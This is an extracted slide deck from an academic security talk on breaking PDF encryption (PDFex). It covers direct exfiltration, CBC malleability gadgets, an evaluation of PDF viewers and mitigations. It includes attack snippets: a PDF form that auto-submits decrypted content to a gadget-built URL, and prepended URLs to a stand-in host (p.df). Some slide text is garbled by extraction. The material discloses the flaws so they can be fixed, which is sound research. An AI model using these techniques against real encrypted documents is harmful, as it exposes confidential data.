How to Break PDF Encryption

Jens Müller1, Fabian Ising 2, Vladislav Mladenov1, Christian Mainka1, Sebastian Schinzel2, Jörg Schwenk2

1 Ruhr University Bochum 2 Münster University of Applied Sciences

PDFex
· Attack with a logo · Novel attack techniques
targeting PDF encryption
­ Direct exfiltration ­ Malleability gadgets
2

Overview
1. Introduction 2. Attacker Model 3. Direct Exfiltration 4. Malleability Gadgets 5. Evaluation 6. Mitigation
3

Portable Document Format

"De facto standard for electronic exchange of documents" -- Adobe

FIRST VERSION RELEASED IN
1993

250 BILLION
PDF DOCUMENTS OPENED IN 2018

BY ADOBE
PDF-2.0
RELEASED IN 2017, LATEST VERSION BY ISO

USED BY
~99%
COMPANIES AND GOVERNMENTAL INSTITUTIONS WORLDWIDE

4

PDF has become rather popular
5

Almost as popular as the Queen!
6

Portable Document Format

"De facto standard for electronic exchange of documents" -- Adobe

FIRST VERSION RELEASED IN
1993 BY ADOBE
PDF-2.0
RELEASED IN 2017, LATEST VERSION BY ISO

250 BILLION

PDF DOCUMENTS OPENED IN 2018
USED BY
~99%

SUPPORTS
AES
ENCRYPTION

COMPANIES AND GOVERNMENTAL INSTITUTIONS WORLDWIDE

7

Portable Document Format
"De facto standard for electronic exchange of documents" -- Adobe

AES is good. Nothing can go wrong.

SUPPORTS
AES
ENCRYPTION

7

Who uses PDF Encryption?
8

Source: Kreissparkasse Stade

Who uses PDF Encryption?
Source: Encryptomatic LCC
9

Who uses PDF Encryption?
10

Source: Sharp Corporation

Who uses PDF Encryption?
11

Source: US Department of Justice

Overview
1. Introduction 2. Attacker Model 3. Direct Exfiltration 4. Malleability Gadgets 5. Evaluation 6. Mitigation
12

Attacker Model
Alice

Bob
13

Attacker Model
Storage
14

Attacker Model
15

Attacker Model
15

Attacker Model
15

Attacker Model

Password:
******
15

Overview
1. Introduction 2. Attacker Model 3. Direct Exfiltration 4. Malleability Gadgets 5. Evaluation 6. Mitigation
16

PDF Encryption in a Nutshell
17

Gaps in PDF Encryption
18

Gaps in PDF Encryption
· Document structure is unencrypted!
­Only strings and streams are encrypted
· Reveals a lot information
­Number/size of pages/objects/links/...
18

Gaps in PDF Encryption
19

Gaps in PDF Encryption
· Support for partial encryption! · Attacker`s content can be mixed
with actually encrypted content
We found 18 different techniques!
19

201

Simple Content Overlay
· We can add new content to encrypted PDF files · Fair enough, protects confidentiality, not integrity · Can we do more, e.g. targeted manipulations?
21

Direct Exfiltration
Can we somehow exfiltrate the plaintext?
22

Direct Exfiltration
23

Direct Exfiltration through PDF Forms
24

Direct Exfiltration through PDF Forms
24

25

Direct Exfiltration via Hyperlinks
26

Direct Exfiltration with JavaScript
27

Overview
1. Introduction 2. Attacker Model 3. Direct Exfiltration 4. Malleability Gadgets 5. Evaluation 6. Mitigation
29

PDF Encryption - History

Specification Algorithm/Key Length Key derivation Integrity Protection State

PDF 1.1 - 1.3 RC4 40-bit

PDF 1.4

RC4 128-bit

PDF 1.5

RC4 128-bit

PDF 1.6 and 1.7 AES-CBC 128-bit

PDF 1.7 EL 3 AES-CBC 256-bit

PDF 1.7 EL 8 AES-CBC 256-bit

Object Level Object Level Object Level Object Level Document Level Document Level

Deprecated Deprecated Deprecated
Deprecated

30

PDF Encryption - History

Specification Algorithm/Key Length Key derivation State

PDF 1.1 - 1.3 RC4 40-bit

PDF 1.4

RC4 128-bit

PDF 1.5

RC4 128-bit

PDF 1.6 and 1.7 AES-CBC 128-bit

PDF 1.7 EL 3 AES-CBC 256-bit

PDF 1.7 EL 8 AES-CBC 256-bit

Object Level

Deprecated

Object Level

Deprecated

Object Level

Deprecated

Object Level

Document Level Deprecated

Document Level

31

CBC Gadgets
Haven`t we seen this somewhere before?
32

Malleability Gadgets Ciphertext Malleability Known Plaintext Exfiltration Channel
34

Malleability Gadgets



0

Decryption

BT\n/F1 22 Tf\n
0

1
Decryption

70 750 Td

1

35

Malleability Gadgets



0

Decryption

ZT\n/F1 22 Tf\n
0

1
Decryption

70 750 Td

1

36

Malleability Gadgets CBC Malleability

Gadget

0

0

Decryption

1
Decryption

00 00 00 00 00 00 00 00
00

70 750 Td

1

37

Malleability Gadgets CBC Malleability

0

0

Decryption

(http://p.df/


1
Decryption

70 750 Td

1

38

Malleability Gadgets CBC Malleability

-1

0

Decryption

Decryption

70 750 Td
-1

Random

0
Decryption

(http://p.df/



39

Prerequisites Ciphertext Malleability Known Plaintext Exfiltration Channel
40

Known Plaintext

known plaintext by design
41

Known Plaintext

Document wide Key

42

Add permissions to the PDF
Format
Known plaintext is available to attackers!

Encrypt them to prevent tampering
Known plaintext is available to attackers!
43

Malleability Gadgets Ciphertext Malleability Known Plaintext Exfiltration Channel
44

Gadget Attacks

· 12 Bytes of known plaintext are enough to
· Change displayed text

stream

BT

% 20 (4 + 16) random bytes

(This ) Tj% 20 random bytes

(is in) Tj% 20 random bytes

(jecte) Tj% 20 random bytes

(d!!!) Tj% 20 random bytes

ET

% 20 random bytes

endstream

45

Gadget Attacks

· 12 Bytes of known plaintext are enough to
· Change displayed text

stream

BT

% 20 (4 + 16) random bytes

(This ) Tj% 20 random bytes

(is in) Tj% 20 random bytes

(jecte) Tj% 20 random bytes

(d!!!) Tj% 20 random bytes

ET

% 20 random bytes

endstream

46

Gadget Attacks
· 12 Bytes of known plaintext are enough to
· Change displayed text · Define a new form submit URL
1 0 obj << /Type /Catalog /AcroForm
<< /Fields [<< /T (x) /V 2 0 R >>] >> /OpenAction << /S /SubmitForm /F <CBC gadget as form URL> >> >> endobj
2 0 obj stream [encrypted data] % content to exfiltrate endstream endobj
47

48

Gadget Attacks
· 12 Bytes of known plaintext are enough to
· Change displayed text · Define a new form submit URL · Prepend URLs to existing plaintext
2 0 obj <modified encrypted data> endobj
http://p.df/[20 bytes random]Confidential plaintext!
49

Gadget Attacks - Issues
· Gadgets are short (12 bytes)
· Short URLs · Random Bytes
· Compressed plaintexts are harder to exfiltrate
· Breaks URL encoders · Pre- and appending to compressed plaintexts is complicated
50

Compression ­ Friend or Foe
2 0 obj << /Type /ObjStm /N 1 /First 65 /Length ... >> stream <Deflate Header>3 0[random](http://p.df/[random]
(http://p.df/Decompressed Confidential content endstream endobj
54

Overview
1. Introduction 2. Attacker Model 3. Direct Exfiltration 4. Malleability Gadgets 5. Evaluation 6. Mitigation
55

Platform
Windows
macOS Linux Web

Application Acrobat Reader DC Foxit Reader PDF-XChange Viewer Perfect PDF Reader PDF Studio Viewer Nitro Reader Acrobat Pro DC Foxit PhantomPDF PDF-XChange Editor Perfect PDF Premium PDF Studio Pro Nitro Pro Nuance Power PDF iSkysoft PDF Editor Master PDF Editor Soda PDF Desktop PDF Architect PDFelement Preview Skim Evince Okular MuPDF Chrome Firefox Safari Opera

Direct Exfiltration
                          

Malleability Gadgets
                          

Evaluation results
 Exfiltration (no user interaction)  Exfiltration (with user interaction)  No exfiltration / not vulnerable
56

Platform
Windows
macOS Linux Web

Application Acrobat Reader DC Foxit Reader PDF-XChange Viewer Perfect PDF Reader PDF Studio Viewer Nitro Reader Acrobat Pro DC Foxit PhantomPDF PDF-XChange Editor Perfect PDF Premium PDF Studio Pro Nitro Pro Nuance Power PDF iSkysoft PDF Editor Master PDF Editor Soda PDF Desktop PDF Architect PDFelement Preview Skim Evince Okular MuPDF Chrome Firefox Safari Opera

Direct Exfiltration
                          

Malleability Gadgets
                          

Evaluation results
 Exfiltration (no user interaction)  Exfiltration (with user interaction)  No exfiltration / not vulnerable
56

Overview
1. Introduction 2. Attacker Model 3. Direct Exfiltration 4. Malleability Gadgets 5. Evaluation 6. Mitigation
57

Signatures
· Signed PDFs should prevent the attack, right?
58

Signatures
· Signed PDFs should prevent the attack, right?
WRONG: 1. Do not prevent opening 2. Can be stripped 3. Can be forged
58

Closing Backchannels
· Close all exfiltration channels!
· Hard to do! · How do you even find all of them in a ca. 800 pages standard?
· Should we really remove ...
· Forms · Hyperlinks · JavaScript (okay, maybe that one)
· Ask the user before connecting to a server
59

Short Term Mitigation
Apple:
Google: 60

Mitigation
· Against wrapping attacks:
· Deprecate partial encryption · Short term: Disallow access from unencrypted to encrypted objects
· Against CBC Gadget attacks:
· Use authenticated encryption · Be careful of downgrade attacks
61

Mitigation
·"TAhgaisinhstawsrbapepeinngeasttcaaclkast: ed to the ISO working group on·· CDSrheyoprprtetctoeartmeap:naDdritsiaaSlllioegwnncarayctpcuetisorsnefrsomanundenwcriyllptbedettoaeknecrnyputepd oibnjects the next revision of the PDF Spec."
· Against CBC Gadget attacks:
· Use authenticated encryption
- ·ABde ocabreeful of downgrade attacks
62

Black Hat Sound Bytes

· PDF documents allow for partial encryption · PDF uses legacy crypto (Unauthenticated CBC) · PDF is a data format that can "exfiltrate itself"

Thank you! Questions?

 team@pdf-insecurity.org  https://pdf-insecurity.org

63

